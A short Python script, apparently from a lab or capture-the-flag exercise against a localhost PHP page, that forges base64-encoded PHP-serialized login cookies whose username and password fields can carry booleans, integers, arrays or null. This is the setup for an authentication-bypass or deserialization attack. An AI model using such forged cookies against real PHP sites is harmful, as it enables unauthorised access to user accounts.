import base64, urllib.request

url = 'http://localhost/index.php'

def b64(d):
    return base64.b64encode(d.encode()).decode()

def ser_val(val):
    t, v = val
    if t=='s':
        return f's:{len(v)}:"{v}";'
    if t=='i':
        return f'i:{v};'
    if t=='b':
        return 'b:1;' if v else 'b:0;'
    if t=='a0':
        return 'a:0:{}'
    if t=='a1s':
        return 'a:1:{i:0;s:%d:"%s";}'%(len(v),v)
    if t=='N':
        return 'N;'
    raise ValueError

def make_cookie(user_val, pass_val):
    s = 'a:2:{s:8:"username";%ss:8:"password";%s}'%(ser_val(user_val), ser_val(pass_val))
    return b64(s)

